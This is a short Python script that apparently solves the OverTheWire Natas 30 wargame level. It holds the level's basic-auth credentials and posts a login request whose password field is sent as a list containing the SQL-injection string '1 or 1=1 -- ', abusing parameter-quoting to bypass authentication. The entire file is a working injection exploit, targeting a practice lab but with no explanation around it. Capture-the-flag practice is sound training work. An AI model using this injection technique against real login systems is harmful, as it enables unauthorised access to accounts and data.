import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas30', 'frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF')
url = "http://natas30.natas.labs.overthewire.org/index.pl"

params = {
    "username": "natas30",
    "password": ["1 or 1=1 -- ", 4]
}

r = requests.post(url, data=params, auth=basicAuth)
print(r.text)